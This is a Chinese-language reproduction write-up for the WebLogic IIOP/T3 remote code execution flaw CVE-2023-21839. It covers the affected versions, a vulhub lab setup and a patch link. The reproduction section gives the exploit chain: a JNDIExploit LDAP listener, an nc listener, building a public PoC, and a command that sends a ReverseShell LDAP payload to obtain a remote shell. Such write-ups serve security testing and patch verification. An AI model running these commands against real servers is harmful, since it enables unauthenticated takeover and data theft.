**漏洞描述:**  
WebLogic是美国Oracle公司出品的一个application
server，用于本地和云端开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。WebLogic
Server是一个基于JAVAEE架构的中间件，将Java的动态功能和Java
Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中，提供了Java Enterprise Edition (EE)和Jakarta
EE的可靠、成熟和可扩展的实现。  
WebLogic 存在远程代码执行漏洞（CVE-2023-21839/CNVD-2023-04389），由于Weblogic
IIOP/T3协议存在缺陷，当IIOP/T3协议开启时，允许未经身份验证的攻击者通过IIOP/T3协议网络访问攻击存在安全风险的WebLogic
Server，漏洞利用成功WebLogic Server可能被攻击者接管执行任意命令导致服务器沦陷或者造成严重的敏感数据泄露。
**影响范围:**  
Oracle Weblogic Server 12.2.1.3.0  
Oracle Weblogic Server 12.2.1.4.0  
Oracle Weblogic Server 14.1.1.0.0
**漏洞复现:**  
漏洞机器环境搭建：
    CVE-2023-21839 项目镜像，链接如下:
    https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2023-21839
上传至 VPS，使用以下命令在 VPS 搭建 docker 环境；  
docker-compose up -d  
然后访问VPS地址,7001端口:
    访问管理地址:
    http://xx.xx.xx.xx:7001/console
将 JNDI Exploit-1.2命令注入工具上传到我们的 VPS 攻击机，开启 jndi 监听
    java -jar JNDIExploit-1.2-SNAPSHOT.jar -i xx.xx.xx.xx
使用nc监听端口  
POC如下:
    https://github.com/4ra1n/CVE-2023-21839
编译:  
cd cmd  
go build -o CVE-2023-21839.exe  
反弹shell
    CVE-2023-21839.exe -ip xx.xx.xx.xx -port 7001 -ldap ldap://xx.xx.xx.xx:1389/Basic/ReverseShell/xx.xx.xx.xx/6789
成功获得反弹shell  
**漏洞修复:**  
厂商已发布了漏洞修复补丁  
下载链接：  
[https://support.oracle.com/rs?type=doc&id=2917213.2](https://support.oracle.com/rs?type=doc&id=2917213.2)